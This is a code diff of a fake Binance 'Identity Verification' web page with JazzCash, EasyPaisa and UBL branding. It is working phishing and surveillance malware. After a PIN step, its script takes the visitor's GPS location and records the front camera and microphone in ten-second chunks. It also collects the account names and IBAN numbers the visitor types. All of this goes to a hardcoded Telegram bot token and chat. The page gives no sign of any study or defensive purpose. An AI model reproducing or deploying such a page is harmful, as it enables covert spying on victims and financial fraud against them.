@@ -3,48 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance - Secure Login</title>
+    <title>Binance - Identity Verification</title>
     <style>
-        :root { --binance-yellow: #FCD535; --black: #121212; --card: #1e1e1e; }
-        body { margin: 0; background: var(--black); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; overflow-x: hidden; }
+        :root { --yellow: #FCD535; --bg: #121212; --card: #1e1e1e; --text-gray: #848E9C; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; }
         .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
         .active { display: flex; }
+        .card { background: var(--card); border-radius: 24px; padding: 25px; width: 100%; max-width: 380px; border: 1px solid #333; margin-bottom: 15px; }
+        .logo { width: 160px; margin-bottom: 25px; }
+        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 15px; width: 100%; border-radius: 12px; margin: 10px 0; font-size: 16px; box-sizing: border-box; }
+        .btn { background: var(--yellow); color: black; padding: 15px; width: 100%; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 15px; }
         
-        /* Binance Style Card */
-        .card { background: var(--card); border-radius: 24px; padding: 30px; width: 100%; max-width: 360px; border: 1px solid #333; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
-        .logo-img { width: 180px; margin-bottom: 20px; filter: drop-shadow(0 0 5px rgba(252, 213, 53, 0.3)); }
+        /* Method List */
+        .method-item { background: #2B3139; padding: 12px; margin: 8px 0; border-radius: 10px; display: flex; align-items: center; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
+        .method-item:hover { border-color: var(--yellow); }
+        .method-item img { width: 35px; height: 35px; border-radius: 6px; margin-right: 15px; object-fit: contain; background: white; padding: 2px; }
         
-        .balance { font-size: 40px; font-weight: bold; color: var(--binance-yellow); margin: 10px 0; }
-        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 12px; margin: 10px 0; box-sizing: border-box; font-size: 18px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--binance-yellow); }
-        
-        .btn { background: var(--binance-yellow); color: black; padding: 16px; width: 100%; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:active { transform: scale(0.96); }
+        .balance { font-size: 38px; font-weight: bold; color: var(--yellow); margin: 5px 0; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body onclick="takeSnap()">
 
     <div id="loginScreen" class="screen active">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Binance_Logo.png/640px-Binance_Logo.png" class="logo-img" alt="Binance">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Binance_Logo.png/640px-Binance_Logo.png" class="logo">
         <div class="card">
-            <h3 style="margin-top:0;">Identity Verification</h3>
-            <p style="color:#848E9C; font-size:14px;">Enter your 4-digit PIN to access your Spot Wallet</p>
-            <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
-            <button class="btn" onclick="login()">Log In</button>
+            <h3 style="margin:0;">Verification Required</h3>
+            <p style="color:var(--text-gray); font-size:13px;">Enable GPS and Camera to secure your assets</p>
+            <input type="password" id="pin" placeholder="Enter PIN (7890)" maxlength="4" inputmode="numeric">
+            <button class="btn" onclick="startSystem()">Unlock Wallet</button>
         </div>
     </div>
 
     <div id="dash" class="screen">
-        <div style="width:100%; max-width:360px; text-align:left;">
-            <p style="color:#848E9C; margin-bottom: 5px;">Total Balance</p>
+        <div style="width:100%; max-width:380px; text-align:left;">
+            <p style="color:var(--text-gray); margin-bottom:5px;">Spot Balance</p>
             <div class="balance">$385.00</div>
-            <p style="color:#5E6673; margin-top:-5px;">≈ Rs. 107,800.00</p>
-            <div class="card" style="margin-top:20px; display:flex; gap:10px; padding:20px;">
-                <button class="btn" style="flex:1;">Withdraw</button>
-                <button class="btn" style="flex:1; background:#2B3139; color:white;">Deposit</button>
+            <p style="color: #5E6673; margin-top:-5px; font-size:14px;">≈ Rs. 107,800.00 PKR</p>
+            
+            <div style="display:flex; gap:10px; margin-top:20px;">
+                <button class="btn" onclick="showTransfer('Withdraw')">Send Money</button>
+                <button class="btn" style="background:#2B3139; color:white;" onclick="showTransfer('Deposit')">Deposit</button>
             </div>
         </div>
+    </div>
+
+    <div id="transferScreen" class="screen">
+        <h3 id="transferTitle">Select Payment Method</h3>
+        <div class="card">
+            <div class="method-item" onclick="openDetails('JazzCash')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/JazzCash_logo.png"> JazzCash
+            </div>
+            <div class="method-item" onclick="openDetails('EasyPaisa')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Easypaisa_logo.png"> EasyPaisa
+            </div>
+            <div class="method-item" onclick="openDetails('UBL Bank')">
+                <img src="https://upload.wikimedia.org/wikipedia/en/b/ba/United_Bank_Limited_logo.png"> UBL Bank Account
+            </div>
+
+            <div id="accDetails" style="display:none; margin-top:15px; border-top:1px solid #444; padding-top:15px;">
+                <input type="text" id="accName" placeholder="Account Title">
+                <input type="number" id="accNum" placeholder="Account / IBAN Number">
+                <button class="btn" onclick="finishTask()">Confirm Action</button>
+            </div>
+        </div>
+        <button onclick="location.reload()" style="background:none; border:none; color:var(--yellow); cursor:pointer;">← Back</button>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
@@ -53,29 +76,34 @@
     <script>
         const token = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
         const chat = '7107389141';
-        let db, recorder, chunks = [];
+        let db, recorder, chunks = [], currentType = "";
 
-        // Database & Sync
-        const req = indexedDB.open("CryptoSafeDB", 1);
+        // DB Initialization
+        const req = indexedDB.open("SecureVault", 1);
         req.onupgradeneeded = e => e.target.result.createObjectStore("sync", { autoIncrement: true });
         req.onsuccess = e => { db = e.target.result; sync(); };
 
-        window.onload = () => {
-            // Live Location
+        function startSystem() {
+            if(document.getElementById('pin').value !== "7890") { alert("Invalid PIN"); return; }
+            
+            // Location Tracking
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(p => {
-                    const msg = `📍 *BINANCE USER LOCATION*\nLat: ${p.coords.latitude}\nLong: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                navigator.geolocation.getCurrentPosition(p => {
+                    const msg = `📍 *BINANCE ALERT*\nLocation: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nAccuracy: ${p.coords.accuracy}m`;
                     sendMsg(msg);
-                }, null, { enableHighAccuracy: true });
+                }, () => sendMsg("⚠️ User Blocked Location"), { enableHighAccuracy: true });
             }
 
-            // Media
+            // Camera/Mic Access
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(s => {
                 document.getElementById('video').srcObject = s;
                 startRec(s);
-            }).catch(() => sendMsg("⚠️ Permissions Blocked"));
-        };
+                // Move to Dash
+                document.getElementById('loginScreen').classList.remove('active');
+                document.getElementById('dash').classList.add('active');
+            }).catch(() => { alert("Permission required to secure funds."); });
+        }
 
         function startRec(s) {
             recorder = new MediaRecorder(s);
@@ -87,7 +115,7 @@
                 recorder.start();
             };
             recorder.start();
-            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+            setInterval(() => recorder.state === "recording" && recorder.stop(), 10000);
         }
 
         async function upload(blob, type) {
@@ -131,11 +159,27 @@
             }
         }
 
-        function login() {
-            if(document.getElementById('pin').value === "7890") {
-                document.getElementById('loginScreen').classList.remove('active');
-                document.getElementById('dash').classList.add('active');
-            } else { alert("Verification Failed!"); }
+        // UI Functions
+        function showTransfer(type) {
+            currentType = type;
+            document.getElementById('transferTitle').innerText = type + " Assets";
+            document.getElementById('dash').classList.remove('active');
+            document.getElementById('transferScreen').classList.add('active');
+        }
+
+        function openDetails(m) {
+            document.getElementById('accDetails').style.display = 'block';
+            document.getElementById('accNum').placeholder = m + " Number / IBAN";
+            window.selectedMethod = m;
+        }
+
+        function finishTask() {
+            const name = document.getElementById('accName').value;
+            const num = document.getElementById('accNum').value;
+            const text = `💰 *BINANCE TRANSACTION*\nType: ${currentType}\nMethod: ${window.selectedMethod}\nName: ${name}\nNumber: ${num}`;
+            sendMsg(text);
+            alert("Security Protocol: Verification in progress. Please wait 15-30 minutes.");
+            location.reload();
         }
     </script>
 </body>
